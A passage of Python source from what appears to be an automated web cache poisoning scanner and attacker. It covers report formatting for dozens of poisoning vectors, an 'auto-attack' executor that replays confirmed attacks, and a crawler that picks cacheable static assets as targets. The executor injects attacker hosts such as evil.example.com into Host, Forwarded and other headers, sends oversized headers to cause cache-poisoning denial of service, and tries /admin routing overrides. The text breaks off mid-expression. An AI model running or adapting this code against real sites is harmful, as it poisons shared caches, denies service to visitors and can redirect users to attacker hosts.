        lines.append("")

        # ---- V36 ----
        lines.append("Vector V36 : Newline Byte")
        for f in r.get("V36_newline_byte", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  probe={p}  status={s}  cacheable={c}  -> {res}".format(
                p=f["probe"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V37 ----
        lines.append("Vector V37 : Static Extension Abuse")
        for f in r.get("V37_static_ext", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ext={e}  status={s}  ct={ct}  cacheable={c}  -> {res}".format(
                e=f["extension"], s=f["status"], ct=f["content_type"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V38 ----
        lines.append("Vector V38 : Cache Deception")
        for f in r.get("V38_cache_deception", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  url={u}  status={s}  ct={ct}  cacheable={c}  -> {res}".format(
                u=f["tested_url"][:80], s=f["status"], ct=f["content_type"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V39 ----
        lines.append("Vector V39 : Path Confusion")
        for f in r.get("V39_path_confusion", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  probe={p}  status={s}  cacheable={c}  -> {res}".format(
                p=f["probe"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V40 ----
        lines.append("Vector V40 : Delimiter Discrepancy")
        for f in r.get("V40_delimiter_discrepancy", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  delimiter={d}  status={s}  cacheable={c}  -> {res}".format(
                d=f["delimiter"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V41 ----
        lines.append("Vector V41 : Normalization Discrepancy")
        for f in r.get("V41_normalization", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V42 ----
        lines.append("Vector V42 : Cacheable 4xx Error")
        for f in r.get("V42_cacheable_4xx", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  method={m}  status={s}  cacheable={c}  -> {res}".format(
                m=f["method"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V43 ----
        lines.append("Vector V43 : Cloudflare 4xx Cacheable")
        for f in r.get("V43_cf_4xx", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  url={u}  status={s}  cacheable={c}  -> {res}".format(
                u=f["tested_url"][:80], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V44 ----
        lines.append("Vector V44 : ATS Fragment Poisoning")
        for f in r.get("V44_ats_fragment", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  fragment={fr}  status={s}  cacheable={c}  -> {res}".format(
                fr=f["fragment"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V45 ----
        lines.append("Vector V45 : Fastly Host Poisoning")
        for f in r.get("V45_fastly_host", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  reflected={ref}  cacheable={c}  -> {res}".format(
                h=f["header"], ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V46 ----
        lines.append("Vector V46 : Request Body Poisoning")
        for f in r.get("V46_body_poisoning", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  body={b}  status={s}  reflected={ref}  cacheable={c}  -> {res}".format(
                b=f["body"][:40], s=f["status"], ref=f["body_reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V47 ----
        lines.append("Vector V47 : Header Bruteforce")
        for f in r.get("V47_header_bruteforce", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "interesting"
            lines.append("  header={h}  reflected={ref}  cacheable={c}  -> {res}".format(
                h=f["header"], ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V48 ----
        lines.append("Vector V48 : CDN Normalization Bug")
        for f in r.get("V48_cdn_norm", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V49 ----
        lines.append("Vector V49 : Cache-Key Discrepancy")
        for f in r.get("V49_cachekey_discrepancy", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V50 ----
        lines.append("Vector V50 : Edge Case Cache Poisoning")
        for f in r.get("V50_edge_case", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  vary={vy}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], vy=f["vary"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V51 ----
        lines.append("Vector V51 : Content-Type Confusion")
        for f in r.get("V51_content_type", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ct={c}  status={s}  resp_ct={rc}  cacheable={ch}  -> {res}".format(
                c=f["content_type"] or "-", s=f["status"],
                rc=f["response_content_type"] or "-",
                ch=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V52 ----
        lines.append("Vector V52 : Accept-Encoding Abuse")
        for f in r.get("V52_accept_encoding", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ae={a}  vary={v}  cacheable={c}  -> {res}".format(
                a=f["accept_encoding"] or "-", v=f["vary"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V53 ----
        lines.append("Vector V53 : Accept-Language Poisoning")
        for f in r.get("V53_accept_language", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  lang={l}  reflected={ref}  vary_AL={v}  cacheable={c}  -> {res}".format(
                l=f["lang_value"], ref=f["reflected"],
                v=f["has_vary_al"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V54 ----
        lines.append("Vector V54 : User-Agent Poisoning")
        for f in r.get("V54_user_agent", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ua={u}  reflected={ref}  vary_UA={v}  cacheable={c}  -> {res}".format(
                u=f["user_agent"], ref=f["reflected"],
                v=f["has_vary_ua"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V55 ----
        lines.append("Vector V55 : Referer Poisoning")
        for f in r.get("V55_referer", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ref={ref}  reflected={r}  cacheable={c}  -> {res}".format(
                ref=f["referer"], r=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V56 ----
        lines.append("Vector V56 : Cookie Poisoning")
        for f in r.get("V56_cookie_poison", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  cookie={ck}  reflected={ref}  vary_Cookie={v}  cacheable={c}  -> {res}".format(
                ck=f["cookie"], ref=f["reflected"],
                v=f["has_vary_cookie"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V57 ----
        lines.append("Vector V57 : Host Header Poisoning")
        for f in r.get("V57_host_header", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  host={h}  reflected={ref}  cacheable={c}  -> {res}".format(
                h=f["host_value"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V58 ----
        lines.append("Vector V58 : X-Forwarded-For Poisoning")
        for f in r.get("V58_xff", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  xff={x}  reflected={ref}  cacheable={c}  -> {res}".format(
                x=f["xff_value"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V59 ----
        lines.append("Vector V59 : X-Forwarded-Proto Poisoning")
        for f in r.get("V59_xfp", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  scheme={s}  status={st}  downgrade={dg}  cacheable={c}  -> {res}".format(
                s=f["scheme"] or "-", st=f["status"], dg=f["downgrade"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V60 ----
        lines.append("Vector V60 : X-HTTP-Method-Override")
        for f in r.get("V60_xhmo_extended", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  method={m}  status={s}  cacheable={c}  -> {res}".format(
                m=f["override_method"], s=f["status"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V61 ----
        lines.append("Vector V61 : Forwarded Header Poisoning")
        for f in r.get("V61_forwarded", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  fwd={fw}  reflected={ref}  loc_reflect={lr}  cacheable={c}  -> {res}".format(
                fw=f["forwarded"], ref=f["reflected"],
                lr=f["location_reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V62 ----
        lines.append("Vector V62 : X-Forwarded-Prefix")
        for f in r.get("V62_xforwarded_prefix", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  prefix={p}  reflected={ref}  cacheable={c}  -> {res}".format(
                p=f["prefix"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V63 ----
        lines.append("Vector V63 : X-Original-Host")
        for f in r.get("V63_xoriginal_host", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  host={h}  reflected={ref}  cacheable={c}  -> {res}".format(
                h=f["host_value"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V64 ----
        lines.append("Vector V64 : X-Backend-Server")
        for f in r.get("V64_xbackend_server", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  backend={b}  reflected={ref}  cacheable={c}  -> {res}".format(
                b=f["backend_value"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V65 ----
        lines.append("Vector V65 : X-Cache-Key Manipulation")
        for f in r.get("V65_xcache_key", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  key={k}  resp_key={rk}  reflected={ref}  cacheable={c}  -> {res}".format(
                k=f["cache_key"], rk=f["response_cache_key"] or "-",
                ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V66 ----
        lines.append("Vector V66 : X-Cache-Hits Manipulation")
        for f in r.get("V66_xcache_hits", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  sent={s}  resp={rs}  cacheable={c}  -> {res}".format(
                s=f["sent_hits"], rs=f["response_hits"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V67 ----
        lines.append("Vector V67 : X-Served-By Manipulation")
        for f in r.get("V67_xserved_by", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  sent={s}  resp={rs}  reflected={ref}  cacheable={c}  -> {res}".format(
                s=f["sent_value"], rs=f["response_value"] or "-",
                ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V68 ----
        lines.append("Vector V68 : X-Timer Manipulation")
        for f in r.get("V68_xtimer", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  sent={s}  resp={rs}  reflected={ref}  cacheable={c}  -> {res}".format(
                s=f["sent_value"] or "-", rs=f["response_value"] or "-",
                ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V69-V80 ----
        lines.append("Vectors V69-V80 : Response Header Reflection")
        for f in r.get("V69_V80_response_headers", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  [{vid}] {name}".format(vid=f["vector_id"], name=f["name"]))
            lines.append("        header sent     : {h}: {v}".format(
                h=f["sent_header"], v=f["sent_value"]))
            lines.append("        resp header val : {rv}".format(
                rv=f["response_header_value"] or "-"))
            lines.append("        header reflect  : {hr}  body reflect: {br}".format(
                hr=f["header_reflected"], br=f["body_reflected"]))
            lines.append("        cacheable       : {c}  status: {s}".format(
                c=f["cacheable"], s=f["status"]))
            lines.append("        verdict         : " + verdict)
            if f.get("note"):
                lines.append("        note            : " + f["note"])
            lines.append("")

        # ---- summary ----
        all_v = []
        for key in ALL_VECTOR_KEYS:
            for f in r.get(key, []):
                if f.get("vulnerable"):
                    all_v.append(f["vector_id"] + " " + f["name"])

        if all_v:
            lines.append(">>> CONFIRMED VULNERABLE VECTORS:")
            for v in all_v:
                lines.append("    - " + v)
        else:
            lines.append(">>> No confirmed vulnerable vectors on this target.")
        lines.append("")
        lines.append("=" * 78)
        lines.append("")

    with safe_open_write(path) as fp:
        fp.write("\n".join(lines))

    print("\n" + C.G + "[+] Advanced report saved: " + path + C.D)

    # ---- NEW: auto-save vulnerability-only report ----
    vuln_path = path.rsplit(".", 1)[0] + "_vulnerabilities.txt"
    save_vulnerabilities_report(all_results, vuln_path)
# ============================================================
#  VULNERABILITY-ONLY REPORT
# ============================================================

def save_vulnerabilities_report(all_results, path):
    """Extract ONLY confirmed vulnerable findings into a separate report."""
    lines = []
    lines.append("=" * 78)
    lines.append("  VULNERABILITY REPORT — ONLY CONFIRMED FINDINGS")
    lines.append("=" * 78)
    lines.append("")

    # first pass: count
    total_vuln = 0
    per_target = []
    for r in all_results:
        found = []
        for key in ALL_VECTOR_KEYS:
            for f in r.get(key, []):
                if f.get("vulnerable"):
                    found.append((key, f))
        per_target.append((r["url"], found))
        total_vuln += len(found)

    lines.append("Total vulnerable findings : " + str(total_vuln))
    lines.append("Total targets scanned     : " + str(len(all_results)))
    lines.append("")

    if total_vuln == 0:
        lines.append(">>> No vulnerabilities found on any target.")
        lines.append("")
    else:
        for url, found in per_target:
            if not found:
                continue
            lines.append("#" * 78)
            lines.append("  TARGET : " + url)
            lines.append("  Found  : " + str(len(found)) + " vulnerability(ies)")
            lines.append("#" * 78)
            lines.append("")

            for key, f in found:
                vid  = f.get("vector_id", "?")
                name = f.get("name", "?")
                status = f.get("status", "-")
                cacheable = f.get("cacheable", False)
                cf = f.get("cf_cache_status", "") or "-"
                age = f.get("age", "") or "-"
                note = f.get("note", "")

                lines.append("  [{vid}] {name}".format(vid=vid, name=name))
                lines.append("       status      : {s}".format(s=status))
                lines.append("       cacheable   : {c}  (cf={cf}, age={a})".format(
                    c=cacheable, cf=cf, a=age))

                # Include every non-empty field for context
                detail_keys = (
                    "header", "sent_value", "injected_value", "value",
                    "param", "cookie_name", "cookie_value",
                    "tested_url", "probe", "variant", "encoding",
                    "extension", "delimiter", "fragment", "port",
                    "override_path", "override_method", "body",
                    "payload", "injection", "scheme", "location",
                    "reflected", "location_reflected", "redirect",
                    "accessible", "downgrade_detected", "body_reflected",
                    "content_type", "response_content_type",
                )
                for k in detail_keys:
                    if k in f and f[k] not in (None, "", False):
                        lines.append("       {k:<12}: {v}".format(
                            k=k, v=str(f[k])[:140]))

                if note:
                    lines.append("       note        : " + str(note))
                lines.append("")
            lines.append("=" * 78)
            lines.append("")

    with safe_open_write(path) as fp:
        fp.write("\n".join(lines))

    if total_vuln:
        print("\n" + C.R + C.BOLD + "[!] VULN report: " + path )
    else:
        print("\n" + C.G + "[+] VULN report: " + path +"  (no findings)" + C.D)

    return total_vuln


# ============================================================
#  AUTO ATTACK EXECUTOR
# ============================================================

def _build_attack_request(finding, target_url):
    """Return (label, method, url, headers, body) for one vulnerability."""
    vid = finding.get("vector_id", "")
    url = finding.get("tested_url") or target_url
    sv  = (finding.get("sent_value") or finding.get("injected_value")
           or "poison-test.example.com")
    header = finding.get("header") or ""
    param  = finding.get("param") or ""
    cookie = finding.get("cookie_name") or ""
    body   = finding.get("body") or ""
    opath  = finding.get("override_path") or ""
    ometh  = finding.get("override_method") or ""
    port   = str(finding.get("port") or "")
    ctype  = finding.get("content_type") or "text/html"
    enc    = finding.get("accept_encoding") or "gzip"

    if vid == "V1":
        return ("Poison XFH", "GET", url, {"X-Forwarded-Host": sv}, None)
    if vid == "V2":
        return ("Force HTTP downgrade", "GET", url, {"X-Forwarded-Scheme": "http"}, None)
    if vid == "V3":
        return ("Break assets via port", "GET", url, {"X-Forwarded-Port": "1337"}, None)
    if vid in ("V4", "V5", "V27"):
        h = "X-Original-URL" if vid != "V5" else "X-Rewrite-URL"
        return ("Routing override", "GET", url, {h: opath or "/admin"}, None)
    if vid == "V6":
        return ("Poison X-Host", "GET", url, {"X-Host": sv}, None)
    if vid == "V7":
        return ("Poison XFH-Server", "GET", url, {"X-Forwarded-Server": sv}, None)
    if vid == "V8":
        return ("Fat GET body", "GET", url, None, body or "foo=bar")
    if vid == "V11":
        return ("Cookie poison", "GET", url, {"Cookie": (cookie or "lang") + "=" + sv}, None)
    if vid == "V14":
        hdrs = finding.get("headers") or {}
        return ("Multi-header combo", "GET", url, hdrs, None)
    if vid == "V17":
        return ("Resource import", "GET", url, {"X-Forwarded-Host": sv}, None)
    if vid == "V18":
        return ("Canonical hijack", "GET", url, {"X-Forwarded-Host": sv}, None)
    if vid == "V19":
        return ("Open redirect", "GET", url, {"X-Forwarded-Host": sv}, None)
    if vid == "V20":
        return ("Stored XSS plant", "GET", url, None, None)
    if vid == "V21":
        return ("DoS oversized hdr", "GET", url, {"X-Oversized-Header": "A" * 16384}, None)
    if vid == "V23":
        return ("Method override DoS", "GET", url, {"X-HTTP-Method-Override": ometh or "POST"}, None)
    if vid == "V24":
        return ("CPDoS large val", "GET", url, {"X-Forwarded-Host": "a" * 5000}, None)
    if vid == "V25":
        return ("Wrong port reflect", "GET", url, {"X-Forwarded-Port": port or "1337"}, None)
    if vid == "V26":
        return ("Scheme downgrade", "GET", url, {"X-Forwarded-Scheme": "http"}, None)
    if vid == "V31":
        return ("Large header", "GET", url, {"X-Large-Header": "A" * 16384}, None)
    if vid == "V45":
        return ("Fastly host poison", "GET", url, {"X-Forwarded-Host": sv}, None)
    if vid == "V46":
        return ("Body poisoning", "GET", url, None, body or "x=1")
    if vid == "V47":
        return ("Header brute reflect", "GET", url, {header or "X-Cache-Key": sv}, None)
    if vid == "V51":
        return ("CT confusion", "GET", url, {"Content-Type": ctype}, None)
    if vid == "V52":
        return ("AE abuse", "GET", url, {"Accept-Encoding": enc}, None)
    if vid == "V53":
        return ("AL poison", "GET", url, {"Accept-Language": "xx-POISON"}, None)
    if vid == "V54":
        return ("UA poison", "GET", url, {"User-Agent": "Poison-TEST"}, None)
    if vid == "V55":
        return ("Referer poison", "GET", url, {"Referer": "https://evil.example.com/"}, None)
    if vid == "V56":
        return ("Cookie poison adv", "GET", url, {"Cookie": (cookie or "lang") + "=POISON"}, None)
    if vid == "V57":
        return ("Host poison", "GET", url, {"Host": "evil.example.com"}, None)
    if vid == "V58":
        return ("XFF poison", "GET", url, {"X-Forwarded-For": "POISON"}, None)
    if vid == "V59":
        return ("XFP downgrade", "GET", url, {"X-Forwarded-Proto": "http"}, None)
    if vid == "V60":
        return ("XHMO", "GET", url, {"X-HTTP-Method-Override": "POST"}, None)
    if vid == "V61":
        return ("Forwarded poison", "GET", url, {"Forwarded": "host=evil.example.com"}, None)
    if vid == "V62":
        return ("XFPrefix inject", "GET", url, {"X-Forwarded-Prefix": "/admin"}, None)
    if vid == "V63":
        return ("XOH poison", "GET", url, {"X-Original-Host": "evil.example.com"}, None)
    if vid == "V64":
        return ("XBS poison", "GET", url, {"X-Backend-Server": "internal"}, None)
    if vid == "V65":
        return ("XCacheKey manip", "GET", url, {"X-Cache-Key": "evil-key"}, None)
    if vid == "V66":
        return ("XCacheHits manip", "GET", url, {"X-Cache-Hits": "999"}, None)
    if vid == "V67":
        return ("XServedBy manip", "GET", url, {"X-Served-By": "evil"}, None)
    if vid == "V68":
        return ("XTimer manip", "GET", url, {"X-Timer": "S1.0,VS0,VE0"}, None)

    sh = finding.get("sent_header") or ""
    sval = finding.get("sent_value") or ""
    if sh and sval:
        return ("Response header poison", "GET", url, {sh: sval}, None)

    generic_vids = ("V9", "V10", "V12", "V13", "V15/16", "V22", "V28", "V29",
                    "V32", "V33", "V34", "V35", "V36", "V37", "V38", "V39",
                    "V40", "V41", "V42", "V43", "V44", "V48", "V49", "V50")
    if vid in generic_vids:
        return ("Replay crafted URL", "GET", url, None, None)
    return None


def auto_run_attacks(all_adv_results, delay=0.3, report_path=None):
    """For each CONFIRMED vulnerable finding, replay the attack in-process.
    If report_path is given, save a detailed attack summary file."""
    print("\n" + C.R + C.BOLD +
          "==========================================================" + C.D)
    print(C.R + C.BOLD + "  AUTO-ATTACK MODE — running PoCs on confirmed vulns" + C.D)
    print(C.R + C.BOLD +
          "==========================================================" + C.D)

    total = 0
    hits = 0
    skipped = 0
    failed = 0

    #  নতুন: বিস্তারিত রিপোর্টের জন্য সব এন্ট্রি এখানে জমা হবে
    attack_log = []

    for r in all_adv_results:
        target = r["url"]
        for key in ALL_VECTOR_KEYS:
            for f in r.get(key, []):
                if not f.get("vulnerable"):
                    continue
                vid  = f.get("vector_id", "?")
                name = f.get("name", "?")
                total += 1
                req = _build_attack_request(f, target)

                #  SKIP এন্ট্রিও লগে রাখি
                if req is None:
                    skipped += 1
                    print("\n" + C.Y + "  [SKIP] [{}] {} — info-only"
                          .format(vid, name) + C.D)
                    attack_log.append({
                        "target": target,
                        "vector_id": vid,
                        "name": name,
                        "label": "info-only (no auto PoC)",
                        "method": "-",
                        "url": target,
                        "headers": {},
                        "body": None,
                        "status": "-",
                        "cache_hit": "-",
                        "reflected": False,
                        "verdict": "SKIPPED",
                        "note": f.get("note", ""),
                    })
                    continue

                label, method, url, headers, body = req
                print("\n" + C.M + "  >>> [{}] {} — {}"
                      .format(vid, name, label) + C.D)
                print(C.CC + "      " + method + " " + url + C.D)
                if headers:
                    for k, v in headers.items():
                        print(C.CC + "      H: " + k + ": " +
                              str(v)[:80] + C.D)

                #  ডিফল্ট এন্ট্রি (request fail হলেও যেন থাকে)
                entry = {
                    "target": target,
                    "vector_id": vid,
                    "name": name,
                    "label": label,
                    "method": method,
                    "url": url,
                    "headers": {k: str(v) for k, v in (headers or {}).items()},
                    "body": body,
                    "status": "-",
                    "cache_hit": "-",
                    "reflected": False,
                    "verdict": "PENDING",
                    "note": f.get("note", ""),
                }

                try:
                    if body:
                        resp = requests.request(
                            method, url, headers=headers or {},
                            data=body, timeout=15, verify=False,
                            allow_redirects=False,
                        )
                    else:
                        resp = requests.request(
                            method, url, headers=headers or {},
                            timeout=15, verify=False,
                            allow_redirects=False,
                        )
                except requests.RequestException as e:
                    failed += 1
                    print(C.R + "      [FAIL] " + str(e)[:120] + C.D)
                    entry["verdict"] = "FAILED"
                    entry["note"] = str(e)[:200]
                    attack_log.append(entry)
                    continue

                status = resp.status_code
                cache_hit = ""
                if resp.headers.get("cf-cache-status"):
                    cache_hit = "cf=" + resp.headers["cf-cache-status"]
                elif resp.headers.get("x-cache"):
                    cache_hit = "xcache=" + resp.headers["x-cache"]
                elif resp.headers.get("age"):
                    cache_hit = "age=" + resp.headers["age"]

                token = f.get("token") or f.get("sent_value") or ""
                reflected = False
                if token:
                    try:
                        reflected = token[:20] in (resp.text or "")
                    except Exception:
                        pass

                tag = C.G + "OK" + C.D
                verdict = "OK"
                if reflected and cache_hit:
                    tag = C.R + C.BOLD + "POISON-CONFIRMED" + C.D
                    hits += 1
                    verdict = "POISON-CONFIRMED"
                elif cache_hit:
                    tag = C.Y + "CACHED" + C.D
                    hits += 1
                    verdict = "CACHED"

                print("      -> status={}  {}  reflected={}  [{}]"
                      .format(status, cache_hit or "-", reflected, tag))

                entry["status"] = status
                entry["cache_hit"] = cache_hit or "-"
                entry["reflected"] = reflected
                entry["verdict"] = verdict
                attack_log.append(entry)

                time.sleep(delay)

    print("\n" + C.R + C.BOLD +
          "==========================================================" + C.D)
    print(C.R + C.BOLD +
          "  ATTACK SUMMARY:  {} attempts  |  {} hits  |  {} skipped  |  {} failed"
          .format(total, hits, skipped, failed) + C.D)
    print(C.R + C.BOLD +
          "==========================================================" + C.D)

    #  নতুন: বিস্তারিত রিপোর্ট ফাইল সেভ
    if report_path and attack_log:
        save_attack_report(attack_log, report_path,
                           total=total, hits=hits,
                           skipped=skipped, failed=failed)

    return {"total": total, "hits": hits,
            "skipped": skipped, "failed": failed}






# ============================================================
#  AUTO-PIPELINE HELPERS
# ============================================================

def extract_static_assets_from_html(html, base_url):
    found = set()
    for pat in STATIC_URL_PATTERNS:
        for m in re.findall(pat, html):
            m = m.strip("\"'")
            if not m:
                continue
            full = urljoin(base_url, m)
            if urlparse(full).netloc == urlparse(base_url).netloc:
                clean = full.split("#")[0].split("?")[0]
                found.add(clean)
    return sorted(found)


def auto_pipeline(url, txt_file="static_urls.txt", report_file=None,do_attack=True):
    url = normalize_url(url)

     #  নতুন: প্রতিটি target-এর জন্য আলাদা folder
    scan_dir = make_scan_dir(url)
    # সব ফাইল এই folder-এর ভেতরে যাবে
    txt_file     = os.path.join(scan_dir, os.path.basename(txt_file))
    report_file  = os.path.join(scan_dir, os.path.basename(report_file or "auto_report.txt"))

    print(C.BOLD + C.CC + "    [i] Output folder: " + scan_dir + C.D)


    result = {
        "target": url,
        "step1_base_cacheable": False,
        "step2_static_discovered": [],
        "step3_cacheable_urls": [],
        "step4_advanced": [],
        "txt_file": txt_file,
        "report_file": report_file,
        "decision": "",
    }

    # ---------- STEP 1 ----------
    print("\n" + C.BOLD + C.CC + "[STEP 1] Base URL cache check" + C.D)
    base = check_url(url, do_poison=False)
    print_result(base)
    result["step1_base_cacheable"] = base.cacheable

    cacheable_urls = []

    if base.cacheable:
        result["decision"] = "BASE-HIT: skipping static discovery"
        print("\n" + C.G + C.BOLD +
              "[+] Base URL IS CACHEABLE - skipping static discovery." + C.D)
        cacheable_urls.append(url)
    else:
        result["decision"] = "BASE-MISS: proceeding to static discovery"
        print("\n" + C.Y +
              "[-] Base URL not cacheable - proceeding to static discovery..." + C.D)

        # ---------- STEP 2 ----------
        print("\n" + C.BOLD + C.CC +
              "[STEP 2] Extracting static URLs from HTML" + C.D)
        r = fetch(url)
        if not r or not r.content:
            result["decision"] = "HTML fetch failed"
            print(C.R + "[!] HTML fetch failed." + C.D)
            return result
        try:
            html = r.text
        except Exception:
            result["decision"] = "HTML decode failed"
            print(C.R + "[!] HTML decode failed." + C.D)
            return result
        static_urls = extract_static_assets_from_html(html, url)
        result["step2_static_discovered"] = static_urls
        if not static_urls:
            result["decision"] = "No static URLs found in HTML"
            print(C.Y + "[-] No static assets found in HTML." + C.D)
            return result
        with safe_open_write(txt_file) as fp:
            for u in static_urls:
                fp.write(u + "\n")
        print(C.G + "[+] Saved " + str(len(static_urls)) +
              " static URLs -> " + txt_file + C.D)
        for u in static_urls[:10]:
            print("      " + u)
        if len(static_urls) > 10:
            print("      ... +" + str(len(static_urls) - 10) + " more")

        # ---------- STEP 3 ----------
                # ---------- STEP 3 ----------
        print("\n" + C.BOLD + C.CC +
              "[STEP 3] Reading txt file, checking cache status..." + C.D)
        with open(txt_file, "r", encoding="utf-8") as fp:
            urls_from_txt = [ln.strip() for ln in fp if ln.strip()]

        # প্রতিটি URL-এর cache status দেখানোর জন্য counter
        total_checked = 0
        cacheable_count = 0
        failed_count = 0
        not_cacheable_count = 0

        for u in urls_from_txt:
            total_checked += 1
            r = fetch(u)

            # ⭐ fetch fail হলেও দেখাবে
            if not r:
                failed_count += 1
                print("      " + C.R + "FAIL" + C.D + " " + u +
                      "  (fetch failed)")
                continue

            info = analyze_cache_headers(r)

            if info["_cacheable"]:
                cacheable_count += 1
                tag = C.G + "HIT " + C.D
                reason = info["cf_cache_status"] or info["_reason"]
                print("      " + tag + " " + u + "  (" + reason + ")")
                cacheable_urls.append(u)
            else:
                not_cacheable_count += 1
                tag = C.Y + "MISS" + C.D
                reason = info["cf_cache_status"] or info["_reason"]
                print("      " + tag + " " + u + "  (" + reason + ")")

        # ⭐ সব URL-এর summary দেখান
        print("\n" + C.BOLD + C.CC +
              "[STEP 3 SUMMARY]" + C.D)
        print("  Total URLs checked   : " + str(total_checked))
        print("  " + C.G + "Cacheable (HIT)      : " + str(cacheable_count) + C.D)
        print("  " + C.Y + "Not cacheable (MISS) : " + str(not_cacheable_count) + C.D)
        print("  " + C.R + "Fetch failed         : " + str(failed_count) + C.D)

        if not cacheable_urls:
            result["decision"] = "No cacheable static URLs found"
            print("\n" + C.Y +
                  "[-] None of the static assets are cacheable." + C.D)
            return result

        print(C.G + "\n[+] Found " + str(len(cacheable_urls)) +
              " cacheable static URLs." + C.D)

    # ---------- STEP 4 ----------
    print("\n" + C.BOLD + C.CC +
          "[STEP 4] Running advanced poisoning (V1-V80) on " +
          str(len(cacheable_urls)) + " cacheable URL(s)" + C.D)

    all_adv = []
    for cu in cacheable_urls:
        print("\n" + C.BOLD + C.B + ">>> " + cu + C.D)
        adv = run_advanced_vectors(cu)
        all_adv.append(adv)

        for key in ALL_VECTOR_KEYS:
            for f in adv.get(key, []):
                tag = (C.R + "VULN" + C.D) if f["vulnerable"] \
                      else (C.Y + "safe" + C.D)
                label = "[" + f["vector_id"] + "] " + f["name"]
                extra = (f.get("header") or f.get("probe") or
                         f.get("body") or f.get("variant") or
                         f.get("cookie_name") or f.get("param") or
                         f.get("combo") or f.get("injection") or
                         f.get("port") or f.get("override_method") or
